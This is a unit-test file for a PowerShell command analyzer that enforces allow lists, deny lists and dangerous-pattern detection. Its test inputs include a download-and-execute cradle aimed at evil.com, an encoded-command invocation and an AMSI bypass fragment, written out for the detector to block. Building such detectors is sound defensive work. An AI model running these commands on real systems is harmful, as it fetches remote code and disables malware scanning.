/**
 * PowerShell Shell Analyzer — Unit Tests
 */

import { describe, it, expect, beforeEach } from "vitest";
import { PowerShellAnalyzer, DANGEROUS_PATTERNS } from "../powershell.js";
import type { ShellPolicy } from "../base.js";

// =========================================================================
// DANGEROUS_PATTERNS
// =========================================================================

describe("DANGEROUS_PATTERNS", () => {
  it("should contain IEX pattern", () => {
    expect(DANGEROUS_PATTERNS.some(p => p.includes("IEX"))).toBe(true);
  });

  it("should contain -EncodedCommand pattern", () => {
    expect(DANGEROUS_PATTERNS.some(p => p.includes("-EncodedCommand"))).toBe(true);
  });

  it("should contain New-Object Net.WebClient pattern", () => {
    expect(DANGEROUS_PATTERNS.some(p => p.includes("New-Object\\s+Net\\.WebClient"))).toBe(true);
  });

  it("should contain AMSI bypass pattern", () => {
    expect(DANGEROUS_PATTERNS.some(p => p.includes("AmsiUtils"))).toBe(true);
  });

  it("should contain DownloadString pattern", () => {
    expect(DANGEROUS_PATTERNS.some(p => p.includes("DownloadString"))).toBe(true);
  });
});

// =========================================================================
// PowerShellAnalyzer
// =========================================================================

describe("PowerShellAnalyzer", () => {
  let analyzer: PowerShellAnalyzer;

  beforeEach(() => {
    analyzer = new PowerShellAnalyzer();
  });

  describe("identity", () => {
    it("should have correct shellType", () => {
      expect(analyzer.shellType).toBe("powershell");
    });
  });

  describe("analyze", () => {
    const defaultPolicy: ShellPolicy = {
      allowedCommands: [],
      deniedCommands: [],
      dangerousPatterns: [],
      allowPipe: true,
      allowRedirect: true,
    };

    it("should allow simple Get-Process command", () => {
      const result = analyzer.analyze({
        command: "Get-Process",
        policy: defaultPolicy,
      });
      expect(result.allowed).toBe(true);
      expect(result.shellType).toBe("powershell");
    });

    it("should allow Write-Output command", () => {
      const result = analyzer.analyze({
        command: "Write-Output 'hello'",
        policy: defaultPolicy,
      });
      expect(result.allowed).toBe(true);
    });

    it("should allow Get-ChildItem command", () => {
      const result = analyzer.analyze({
        command: "Get-ChildItem -Path C:\\",
        policy: defaultPolicy,
      });
      expect(result.allowed).toBe(true);
    });

    it("should deny empty command", () => {
      const result = analyzer.analyze({
        command: "",
        policy: defaultPolicy,
      });
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("Empty command");
    });

    it("should deny command not in whitelist", () => {
      const policy: ShellPolicy = {
        allowedCommands: ["Get-Process", "Get-ChildItem"],
        deniedCommands: [],
        dangerousPatterns: [],
        allowPipe: true,
        allowRedirect: true,
      };
      const result = analyzer.analyze({
        command: "Invoke-Expression 'code'",
        policy,
      });
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("not in whitelist");
    });

    it("should deny command in blacklist", () => {
      const policy: ShellPolicy = {
        allowedCommands: [],
        deniedCommands: ["Invoke-Expression", "Start-Process"],
        dangerousPatterns: [],
        allowPipe: true,
        allowRedirect: true,
      };
      const result = analyzer.analyze({
        command: "Invoke-Expression 'code'",
        policy,
      });
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("denied by blacklist");
    });

    it("should deny dangerous pattern", () => {
      const policy: ShellPolicy = {
        allowedCommands: [],
        deniedCommands: [],
        dangerousPatterns: ["-EncodedCommand\\s+"],
        allowPipe: true,
        allowRedirect: true,
      };
      const result = analyzer.analyze({
        command: "powershell -EncodedCommand ABC123",
        policy,
      });
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("Dangerous pattern detected");
    });

    it("should deny pipe when not allowed", () => {
      const policy: ShellPolicy = {
        allowedCommands: [],
        deniedCommands: [],
        dangerousPatterns: [],
        allowPipe: false,
        allowRedirect: true,
      };
      const result = analyzer.analyze({
        command: "Get-Process | Where-Object {$_.Name -eq 'notepad'}",
        policy,
      });
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("Pipe operator is not allowed");
    });

    it("should deny redirect when not allowed", () => {
      const policy: ShellPolicy = {
        allowedCommands: [],
        deniedCommands: [],
        dangerousPatterns: [],
        allowPipe: true,
        allowRedirect: false,
      };
      const result = analyzer.analyze({
        command: "Get-Process > processes.txt",
        policy,
      });
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("Redirect operator is not allowed");
    });

    it("should allow pipe when allowed", () => {
      const policy: ShellPolicy = {
        allowedCommands: [],
        deniedCommands: [],
        dangerousPatterns: [],
        allowPipe: true,
        allowRedirect: true,
      };
      const result = analyzer.analyze({
        command: "Get-Process | Where-Object {$_.Name -eq 'notepad'}",
        policy,
      });
      expect(result.allowed).toBe(true);
    });

    it("should allow redirect when allowed", () => {
      const policy: ShellPolicy = {
        allowedCommands: [],
        deniedCommands: [],
        dangerousPatterns: [],
        allowPipe: true,
        allowRedirect: true,
      };
      const result = analyzer.analyze({
        command: "Get-Process > processes.txt",
        policy,
      });
      expect(result.allowed).toBe(true);
    });

    it("should resolve iex alias to Invoke-Expression", () => {
      const policy: ShellPolicy = {
        allowedCommands: [],
        deniedCommands: ["Invoke-Expression"],
        dangerousPatterns: [],
        allowPipe: true,
        allowRedirect: true,
      };
      const result = analyzer.analyze({
        command: "iex 'code'",
        policy,
      });
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("denied by blacklist");
    });

    it("should resolve iwr alias to Invoke-WebRequest", () => {
      const policy: ShellPolicy = {
        allowedCommands: [],
        deniedCommands: ["Invoke-WebRequest"],
        dangerousPatterns: [],
        allowPipe: true,
        allowRedirect: true,
      };
      const result = analyzer.analyze({
        command: "iwr https://example.com",
        policy,
      });
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("denied by blacklist");
    });

    it("should handle variable assignment prefix", () => {
      const result = analyzer.analyze({
        command: "$procs = Get-Process",
        policy: defaultPolicy,
      });
      expect(result.allowed).toBe(true);
    });

    it("should handle call operator", () => {
      const result = analyzer.analyze({
        command: '& "C:\\Program Files\\app.exe"',
        policy: defaultPolicy,
      });
      expect(result.allowed).toBe(true);
    });

    it("should detect IEX with web download as dangerous", () => {
      const policy: ShellPolicy = {
        allowedCommands: [],
        deniedCommands: [],
        dangerousPatterns: DANGEROUS_PATTERNS,
        allowPipe: true,
        allowRedirect: true,
      };
      const result = analyzer.analyze({
        command: "IEX (New-Object Net.WebClient).DownloadString('https://evil.com/script.ps1')",
        policy,
      });
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("Dangerous pattern detected");
    });

    it("should detect -EncodedCommand as dangerous", () => {
      const policy: ShellPolicy = {
        allowedCommands: [],
        deniedCommands: [],
        dangerousPatterns: DANGEROUS_PATTERNS,
        allowPipe: true,
        allowRedirect: true,
      };
      const result = analyzer.analyze({
        command: "powershell -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0",
        policy,
      });
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("Dangerous pattern detected");
    });

    it("should detect AMSI bypass as dangerous", () => {
      const policy: ShellPolicy = {
        allowedCommands: [],
        deniedCommands: [],
        dangerousPatterns: DANGEROUS_PATTERNS,
        allowPipe: true,
        allowRedirect: true,
      };
      const result = analyzer.analyze({
        command: "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')",
        policy,
      });
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("Dangerous pattern detected");
    });

    it("should return command in result", () => {
      const result = analyzer.analyze({
        command: "Get-Process",
        policy: defaultPolicy,
      });
      expect(result.command).toBe("Get-Process");
    });

    it("should be case-insensitive for pattern matching", () => {
      const policy: ShellPolicy = {
        allowedCommands: [],
        deniedCommands: [],
        dangerousPatterns: DANGEROUS_PATTERNS,
        allowPipe: true,
        allowRedirect: true,
      };
      const result = analyzer.analyze({
        command: "iex (new-object net.webclient).downloadstring('https://evil.com/')",
        policy,
      });
      expect(result.allowed).toBe(false);
    });
  });
});
